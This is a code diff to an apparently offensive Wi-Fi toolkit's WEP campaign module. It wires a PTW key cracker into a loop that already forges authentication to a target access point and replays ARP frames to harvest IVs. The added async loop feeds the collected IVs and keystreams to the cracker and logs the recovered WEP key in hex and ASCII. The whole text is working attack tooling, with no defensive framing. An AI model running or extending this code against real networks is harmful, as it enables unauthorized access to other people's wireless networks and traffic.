@@ -20,14 +20,27 @@ in. The loop self-heals.
 
 from __future__ import annotations
 
+import asyncio
 import logging
 from typing import Callable, Optional
 
 from wifit3.engine.models import AccessPoint
 from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
 from wifit3.engine.attacks.wep.arp_replay import WepArpReplay
+from wifit3.engine.attacks.wep.crack import (
+    PtwCracker,
+    keystream_from_arp_cipher,
+)
 
 logger = logging.getLogger(__name__)
+
+
+def _ascii_hint(key: bytes) -> str:
+    """Show the ASCII form of a key when it's printable (WEP keys are often a
+    word like 'abcde'); otherwise note it's the hex above."""
+    if all(0x20 <= b < 0x7F for b in key):
+        return f'ASCII "{key.decode("ascii")}"'
+    return "hex"
 
 
 class WepCampaign:
@@ -43,6 +56,15 @@ class WepCampaign:
         self.target = target
         self._log = log_callback or (lambda _m: None)
         self._active = False
+
+        # Native PTW cracker, fed incrementally from the collector's crack
+        # samples and re-attempted as more IVs arrive. recover() can spend a
+        # second or two in the fudge search, so it runs in an executor — never
+        # on the UI event loop.
+        self.cracker = PtwCracker()
+        self.recovered_key: Optional[bytes] = None
+        self._crack_cursor = 0
+        self._crack_task: Optional[asyncio.Task] = None
 
         self.fake_auth = WepFakeAuth(iface, target, log_callback=self._log)
         self.replay = WepArpReplay(
@@ -73,18 +95,50 @@ class WepCampaign:
         )
         self.fake_auth.start()
         self.replay.start()
+        self._crack_task = asyncio.create_task(self._crack_loop())
         logger.info("[WEP-Campaign] Started on %s", self.target.bssid)
 
     def stop(self) -> None:
         if not self._active:
             return
         self._active = False
+        if self._crack_task:
+            self._crack_task.cancel()
+            self._crack_task = None
         # Stop replay (TX) before fake-auth so we don't briefly inject while
         # de-registering the forged STA.
         self.replay.stop()
         self.fake_auth.stop()
         self._log("[bold red]✗ Generate IVs stopped.[/bold red]")
         logger.info("[WEP-Campaign] Stopped on %s", self.target.bssid)
+
+    async def _crack_loop(self) -> None:
+        """Feed new crack samples to the PTW cracker and re-attempt recovery as
+        IVs accumulate. The recovery search runs in an executor so a multi-
+        second fudge search never stalls the UI."""
+        try:
+            while self._active and self.recovered_key is None:
+                await asyncio.sleep(3.0)
+                samples = self.iface.wep_collector.crack_samples(self.target.bssid)
+                # Feed only the IVs we haven't fed yet (votes are additive).
+                for iv, cipher in samples[self._crack_cursor:]:
+                    self.cracker.feed(iv, keystream_from_arp_cipher(cipher))
+                self._crack_cursor = len(samples)
+                if not self.cracker.ready:
+                    continue
+                key = await asyncio.get_event_loop().run_in_executor(
+                    None, self.cracker.recover
+                )
+                if key is not None:
+                    self.recovered_key = key
+                    self._log(
+                        f"[bold green]✓ WEP KEY RECOVERED:[/bold green] "
+                        f"[bold]{key.hex()}[/bold] "
+                        f"[dim]({_ascii_hint(key)})[/dim]"
+                    )
+                    return
+        except asyncio.CancelledError:
+            pass
 
     @property
     def is_active(self) -> bool:
